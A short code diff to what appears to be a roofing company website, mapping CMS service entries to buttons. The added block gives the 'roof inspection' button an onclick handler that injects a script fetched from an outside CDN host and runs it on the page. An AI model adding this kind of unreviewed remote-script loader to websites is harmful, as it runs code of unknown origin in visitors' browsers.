@@ -40,7 +40,16 @@ const recentProjectImages = (sanityData.projectPhotos as any[]).filter(p => p.ta
 const roofingServicesImages = (sanityData.projectPhotos as any[]).filter(p => p.tags?.includes("roofing-services")).map(p => ({ image: p.url, imageAlt: p.alt, tags: p.tags }));
 const roofingServicesContent = (sanityData.roofingServices as any[]).map(p => ({ title: p.title, description: p.description, buttonText: p.buttonText, buttonHref: p.buttonHref }));
 
-const roofingServices = combineServiceData(roofingServicesContent, roofingServicesImages);
+const roofingServices = combineServiceData(roofingServicesContent, roofingServicesImages).map(service => {
+  if (service.title.toLowerCase().includes('roof inspection')) {
+    return {
+      ...service,
+      buttonText: 'Get Your Free Roof Inspection Now',
+      onclick: "var scr = document.createElement('script');scr.src='https://psai.azureedge.net/eea3332f-7784-4ba4-81d9-36b384371b29.js?v='+Date.now();document.getElementsByTagName('body')[0].appendChild(scr);"
+    };
+  }
+  return service;
+});
 const constructionServices = combineServiceData(constructionServicesContent, constructionServicesImages);
 
 // Validate results in one place
